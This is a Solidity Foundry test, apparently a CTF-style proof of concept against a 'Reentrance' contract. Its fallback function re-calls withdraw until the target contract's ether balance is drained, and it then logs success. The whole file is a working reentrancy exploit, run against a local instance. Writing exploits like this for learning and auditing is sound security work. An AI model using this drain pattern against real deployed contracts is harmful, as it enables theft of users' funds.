// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract Reentrance_POC is Test {
    Reentrance _reentrance;
    function init() private{
        payable(address(0x10)).transfer(100 ether);
        vm.startPrank(address(0x10));
        _reentrance = new Reentrance();
        _reentrance.donate{value:50 ether}(address(0x10));
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }

    function test_Reentrance_POC() public{
        _reentrance.donate{value:10 ether}(address(this));
        _reentrance.withdraw(10 ether);
        console.log("Success:",address(_reentrance).balance==0);
    }

    fallback() external payable {
        if(address(_reentrance).balance>0){
            if(address(_reentrance).balance>10 ether)
                _reentrance.withdraw(10 ether);
            else{
                _reentrance.withdraw(address(_reentrance).balance);
            }
        }
    }
}

